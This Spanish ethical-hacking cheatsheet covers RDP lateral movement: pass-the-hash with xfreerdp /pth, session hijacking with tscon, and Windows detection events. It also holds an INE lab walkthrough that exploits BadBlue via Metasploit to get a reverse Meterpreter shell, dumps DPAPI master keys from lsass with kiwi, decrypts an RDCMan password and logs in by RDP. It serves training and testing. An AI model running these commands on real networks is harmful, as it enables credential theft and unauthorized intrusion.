
# RDP Lateral Movement

## <mark style="color:purple;">Introducción</mark>

El **Remote Desktop Protocol (RDP)** es un protocolo propietario de Microsoft, que se ejecuta sobre el puerto **`TCP 3389`**, que permite la conexión gráfica a una máquina Windows. Su uso es legítimo para la administración remota, pero los atacantes lo explotan con credenciales robadas para desplazarse de un sistema comprometido a otro. Al usar RDP, el sistema de destino registra el evento de inicio de sesión (normalmente, tipo de acceso **10**, que indica una sesión remota interactiva).

A diferencia de otras herramientas de movimiento lateral, el RDP tiene la gran ventaja de que el atacante obtiene un entorno gráfico completo. Esto le permite no solo ejecutar comandos, sino también deshabilitar protecciones, buscar información sensible visualmente y desplegar malware complejo con interfaces gráficas.

## <mark style="color:purple;">**Técnicas de Ataque Clave a RDP**</mark>

En los siguientes módulos cubrimos en detalle ataques avanzados contra RDP:

{% content-ref url="/pages/mRPaPsEGLLIoMSmu8WjJ" %}
[Ataques a RDP](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/atacando-servicios-comunes/ataques-a-rdp.md)
{% endcontent-ref %}

{% content-ref url="/pages/LEjuugkb5c6oZV6VrJv4" %}
[Bruteforce de Servicios](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/bruteforce-de-servicios.md)
{% endcontent-ref %}

### **Pass-the-Hash (PtH) y Modo de Administración Restringido**

Esta es la técnica más común. Los atacantes pueden autenticarse en un sistema remoto usando el hash NTLM de un usuario válido, sin necesidad de conocer su contraseña en texto claro. Para ello, se aprovechan del **Modo de Administración Restringido (Restricted Admin Mode)**, una característica de seguridad que, irónicamente, permite este tipo de autenticación.

### **Secuestro de Sesión RDP**

Esta es una técnica más sigilosa que no requiere credenciales adicionales. Un atacante con privilegios de administrador en un sistema puede "secuestrar" una sesión de RDP existente de otro usuario para moverse lateralmente a un tercer sistema, o para elevar sus privilegios dentro del mismo equipo.

### SIntaxis de xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password> /size:80% /drive:home,"/home/kali/hack-tools/"
```

<table><thead><tr><th width="324">Comando</th><th>Descripción</th></tr></thead><tbody><tr><td><code>/v:&#x3C;target-IP></code></td><td>IP del host a que nos queremos conectar</td></tr><tr><td><code>/u:&#x3C;usuario> /p:&#x3C;contraseña></code></td><td>Usuario y contraseña</td></tr><tr><td><code>/size</code></td><td>Seleccionar tamaño de ventana o porcentaje <code>%</code></td></tr><tr><td><code>/drive:home,"/home/kali/hack-tools/"</code></td><td>Monta un directorio local como unidad dentro del entorno RDP (útil para enviar archivos y herramientas)</td></tr></tbody></table>

***

## <mark style="color:purple;">**Cheatsheet**</mark>

### **Desde un host Linux**

<table data-header-hidden><thead><tr><th width="140.8148193359375"></th><th></th><th></th><th>Text</th></tr></thead><tbody><tr><td>Herramienta</td><td>Acción / Técnica</td><td>Comando</td><td>Notas / Ejemplos</td></tr><tr><td><strong>xfreerdp</strong></td><td>Conexión RDP con credenciales estándar</td><td><code>xfreerdp /v:&#x3C;IP> /u:&#x3C;user> /p:&#x3C;pass> / size:80%</code></td><td>Incluye opciones como <code>+clipboard</code> o <code>/dynamic-resolution</code>.</td></tr><tr><td><strong>xfreerdp</strong></td><td><strong>Pass-the-Hash (PtH) con RDP</strong></td><td><code>xfreerdp /v:&#x3C;IP> /u:&#x3C;user> /pth:&#x3C;ntlm_hash></code></td><td>Se usa el flag <code>/pth</code> seguido del hash. El modo restringido debe estar activo en el destino.</td></tr><tr><td><strong>rdesktop</strong></td><td>Conexión RDP simple</td><td><code>rdesktop -u &#x3C;user> -p &#x3C;pass> &#x3C;IP></code></td><td>Alternativa más antigua pero funcional.</td></tr><tr><td><strong>remmina</strong></td><td>Conexión RDP con GUI</td><td><code>remmina</code></td><td>Luego configurar la conexión RDP desde la interfaz gráfica.</td></tr><tr><td><strong>NetExec (nxc)</strong></td><td>Enumeración y movimiento con RDP</td><td><code>nxc rdp &#x3C;IP_OBJETIVO> -u &#x3C;USUARIO> -p &#x3C;CONTRASEÑA></code></td><td>También puede usar hash con <code>-H &#x3C;HASH_NTLM></code>.</td></tr></tbody></table>

### **Desde un host Windows (Herramientas nativas)**

<table data-header-hidden><thead><tr><th width="141.55560302734375"></th><th width="176.073974609375"></th><th></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Acción / Técnica</td><td>Comando</td><td>Notas / Ejemplos</td></tr><tr><td><strong><code>mstsc.exe</code></strong></td><td>Conexión RDP estándar</td><td><code>mstsc.exe /v:&#x3C;IP_OBJETIVO></code></td><td>Abre la GUI de conexión a escritorio remoto.</td></tr><tr><td><strong><code>mstsc.exe</code></strong></td><td>Conexión en Modo Restringido</td><td><code>mstsc.exe /restrictedAdmin</code></td><td>Para usar Pass-the-Hash desde Windows. Requiere el modo activo en el destino.</td></tr><tr><td><strong><code>tscon.exe</code></strong></td><td>Secuestro de sesión RDP</td><td><code>tscon &#x3C;ID_SESION> /dest:&#x3C;NOMBRE_SESION_ACTUAL></code></td><td>Ejecutar desde un cmd con privilegios de administrador para tomar control de otra sesión.</td></tr><tr><td><strong><code>qwinsta</code> / <code>query session</code></strong></td><td>Enumerar sesiones RDP</td><td><code>qwinsta</code></td><td>Muestra las sesiones activas en el sistema local, útiles antes de un secuestro.</td></tr></tbody></table>

## **Detección y Mitigación**

#### **¿Cómo detectar actividad maliciosa con RDP?**

* **Artefactos en el Sistema (Host)**:
  * **Eventos de Seguridad**: La herramienta `mstsc.exe` genera el evento **1024** en el log `Microsoft-Windows-TerminalServices-RDPClient/Operational`. El log de seguridad registrará inicios de sesión exitosos con el tipo de acceso **10** (RemoteInteractive) y el evento ID **4624**. Un tipo de acceso 3 (Network) o 7 (Unlock) podría indicar un uso no interactivo.
  * **Creación de Procesos Sospechosos**: Vigila la ejecución de `cmd.exe`, `powershell.exe` o scripts inmediatamente después de un evento de logon RDP (ID 4624), ya que esto puede ser una señal de post-explotación.
* **Indicadores de Red (Network)**:
  * **Tráfico en Puerto 3389**: Monitorizar conexiones entrantes y salientes en el puerto TCP 3389.
  * **Conexiones Anómalas**: Prestar atención a conexiones RDP desde sistemas que no deberían usarlo (ej. servidores web, estaciones de trabajo de usuarios no técnicos).

***

## <mark style="color:purple;">Lab:</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**Dumping RDCMan Credentials**</mark>

Se le proporciona una máquina Kali GUI y una máquina objetivo que ejecuta una aplicación vulnerable. Las máquinas objetivo son accesibles en **'`demo.ine.local`'** y **'`demo2.ine.local`'** .

Tu tarea consiste en identificar la aplicación utilizando las herramientas disponibles en Kali y explotarla con el módulo Metasploit adecuado. A continuación, descubre el archivo \[<https://learn.microsoft.com/en-us/sysinternals/downloads/rdcman]config> y descifra las credenciales de la segunda máquina objetivo.

**Objetivo**: Explotar la aplicación, obtener la sesión de Meterpreter y encontrar la flag.

### Hosts

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.7        INE
127.0.0.1 AttackDefense-Kali
10.10.49.13     INE
10.2.21.75    demo.ine.local
10.2.19.190    demo2.ine.local
```

### Escaneo de puertos

En `demo.ine.local` encontramos un servicio web por el puerto 80, y en `demo2` tenemos los mismos puertos pero sin el servicio web:

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local                                                                                                                            

PORT     STATE SERVICE       VERSION
80/tcp   open  http          BadBlue httpd 2.7
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo2.ine.local                                                                                                                           

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

### Acceso Web

Al acceder vemos que se trata de un `BadBlue Enterprise Edition` que podemos explotar fácilmente con Metasploit:

<figure><img src="/files/ewEmDnKp3bPmMbev9jg6" alt=""><figcaption></figcaption></figure>

### Explotación

```bash
msfconsole
use exploit/windows/http/badblue_ext_overflow
set RHOSTS demo.ine.local
exploit

[*] Started reverse TCP handler on 10.10.49.13:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (176198 bytes) to 10.2.21.75
[*] Meterpreter session 1 opened (10.10.49.13:4444 -> 10.2.21.75:50058) at 2026-04-13 18:26:30 +0530

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Credential Hunting

En el directorio `Documents` del Administrador encontramos un archivo interesante `Production-Server.rdg` que contiene la contraseña cifrada de RDP:

```powershell
meterpreter > ls
Listing: C:\Users\Administrator\Documents
=========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  2234  fil   2020-11-07 13:48:18 +0530  Default.rdp
040777/rwxrwxrwx  0     dir   2020-11-07 06:14:52 +0530  My Music
040777/rwxrwxrwx  0     dir   2020-11-07 06:14:52 +0530  My Pictures
040777/rwxrwxrwx  0     dir   2020-11-07 06:14:52 +0530  My Videos
100666/rw-rw-rw-  1176  fil   2021-06-24 12:37:33 +0530  Production-Server.rdg
040777/rwxrwxrwx  0     dir   2021-06-24 12:25:14 +0530  RDCMan
100666/rw-rw-rw-  402   fil   2020-11-07 12:52:42 +0530  desktop.ini
```

{% code overflow="wrap" %}

```bash
meterpreter > cat Production-Server.rdg 
<?xml version="1.0" encoding="utf-8"?>
<RDCMan programVersion="2.8" schemaVersion="3">
  <file>
    <credentialsProfiles>
      <credentialsProfile inherit="None">
        <profileName scope="Local">ATTACKDEFENSE\Administrator</profileName>
        <userName>Administrator</userName>
  <password>AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAE1DVXDjIxECVqSarB25auwAAAAACAAAAAAAQZgAAAAEAACAAAAA+0scV4eUbeZzmNBTxlywaINPEFJ7ektkD3o+Kj1imugAAAAAOgAAAAAIAACAAAAD55lj7B7BfAiLlc09pkM+snZocXr5disPMWC8QRVFmeSAAAAAvDRw6316bdVZYACrqriDVnthbzifaTLvDEQ81iPbLa0AAAABw+AYzKY0zCmZpAjbhDA3jAEmD02R9SLKOOtuIjr7wP7NzkgNniI+HTxkkZGa0omHwJ3QLD3SJiBjAgdXPocbS</password>
        <domain>ATTACKDEFENSE</domain>
```

{% endcode %}

### Desencriptar contraseña (SharpDPAPI.exe)

{% embed url="<https://github.com/py7hagoras/SharpTools>" %}

Usaremos `SharpDPAPI.exe` para extraer la contraseña en plano. La subiremos desde nuestro Kali Linux con el siguiente comando:

{% code overflow="wrap" %}

```bash
meterpreter > upload /root/Desktop/tools/SharpDPAPI.exe

[*] Uploading  : /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe
[*] Uploaded 77.00 KiB of 77.00 KiB (100.0%): /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe
[*] Completed  : /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe
```

{% endcode %}

Y lo ejecutamos desde una shell:

{% code overflow="wrap" %}

```bash
meterpreter > shell

Process 1224 created.
Channel 4 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Documents

C:\Users\Administrator\Documents> SharpDPAPI.exe rdg /unprotected

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.6.1                               


[*] Action: RDG Triage

[*] Triaging RDCMan.settings Files for ALL users

    RDCManFile    : C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
    Accessed      : 6/24/2021 6:57:31 AM
    Modified      : 6/24/2021 6:57:31 AM

        Default Logon Credentials

          Profile Name : Custom
            UserName   : ATTACKDEFENSE\Administrator

      C:\Users\Administrator\Documents\Production-Server.rdg

        Cred Profiles

          Profile Name : ATTACKDEFENSE\Administrator
            UserName   : ATTACKDEFENSE\Administrator
            Password   : MasterKey needed - {5cd55013-c838-40c4-95a9-26ab076e5abb}

        Servers

          Name         : 1.1.1.1
          Cred Profile : ATTACKDEFENSE\Administrator
```

{% endcode %}

Observamos que necesitamos una Masterkey:

{% code overflow="wrap" %}

```
MasterKey needed - {5cd55013-c838-40c4-95a9-26ab076e5abb}
```

{% endcode %}

### Kiwi (Mimikatz)

Extraeremos la clave como Kiwi desde Meterpreter:

{% code overflow="wrap" %}

```bash
meterpreter > load kiwi

# Necesitamos migrar a un proceso x86 como lsass.exe para que funcione
meterpreter > migrate -N lsass.exe
[*] Migrating from 5076 to 624...
[*] Migration completed successfully.

meterpreter > kiwi_cmd sekurlsa::dpapi

Authentication Id : 0 ; 174014 (00000000:0002a7be)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 4/13/2026 12:46:02 PM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
         [00000000]
         * GUID      :  {6832639e-7437-4f17-8648-c24c95681ba3}
         * Time      :  4/13/2026 12:46:09 PM
         * MasterKey :  3e41b0382f8151f494e0035e9a3dcac0261f51003098317767431cde66908589646747f41b85e987d8e4398118a5e91173ddd417fbb64f52b65cb38513f5b761
         * sha1(key) :  494d9fbceeae1aab376c14a730e779f8ee850f85
         [00000001]
         * GUID      :  {5cd55013-c838-40c4-95a9-26ab076e5abb}
         * Time      :  4/13/2026 12:48:39 PM
         * MasterKey :  be8dabf90b25d127a8b0421c888f5c23c81f8254c25fa861df4c0e61ed665f79dcac5809c793a5a1b65f3604ec1dd216f74badc6e06b04ebff5b87390ce0c794
         * sha1(key) :  d174357a9a91ede12834ad2cfc5a9f94f8956205
```

{% endcode %}

Observamos que hemos encontrado la masterkey y el SHA1 Key del GUID que encontramos anteriormente. Debemos formatearlo en el siguiente formato para usarlo con `SharpDPAPI.exe`:

{% code overflow="wrap" %}

```
GUID:sha1key
```

{% endcode %}

{% code overflow="wrap" %}

```bash
{5cd55013-c838-40c4-95a9-26ab076e5abb}:d174357a9a91ede12834ad2cfc5a9f94f8956205
```

{% endcode %}

### Sharp DPAPI

Le pasamos la cadena de texto anterior a SharpDPAPI.exe y conseguimos la contraseña en plano!

```bash
C:\Users\Administrator\Documents>SharpDPAPI.exe rdg {5cd55013-c838-40c4-95a9-26ab076e5abb}:d174357a9a91ede12834ad2cfc5a9f94f8956205

  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.6.1                               


[*] Action: RDG Triage

[*] Triaging RDCMan.settings Files for ALL users

    RDCManFile    : C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
    Accessed      : 6/24/2021 6:57:31 AM
    Modified      : 6/24/2021 6:57:31 AM

        Default Logon Credentials

          Profile Name : Custom
            UserName   : ATTACKDEFENSE\Administrator

      C:\Users\Administrator\Documents\Production-Server.rdg

        Cred Profiles

          Profile Name : ATTACKDEFENSE\Administrator
            UserName   : ATTACKDEFENSE\Administrator
            Password   : harry_123321

        Servers

          Name         : 10.2.16.110
          Cred Profile : ATTACKDEFENSE\Administrator
```

### Conexión por RDP y acceso a la flag

```bash
┌──(root㉿INE)-[~]
└─# xfreerdp /v:10.2.19.190 /u:administrator /p:harry_123321 /size:80%
```

<figure><img src="/files/Qs1HmCf0kjrSMpJL5Q0E" alt=""><figcaption></figcaption></figure>

### Tip: Envio de archivos por RDP

Podemos configurar xfreerdp para enviar archivos fácilmente entre las máquinas por RDP montando un nuevo disco local:

```bash
xfreerdp /v:10.2.19.190 /u:administrator /p:harry_123321 /size:80% /drive:home,"/root/Desktop/tools/"
```

<figure><img src="/files/LWUOQWSbr4va5ZhrTBMT" alt=""><figcaption></figcaption></figure>

Con eso ya tendríamos todas las herramientas de pentesting de nuestra máquina atacante en la máquina objetivo, y de igual manera nos podríamos enviar archivos desde la máquina Windows a nuestro Kali fácilmente:

<figure><img src="/files/Z35J5NIZOLidxYKE6zZC" alt=""><figcaption></figcaption></figure>
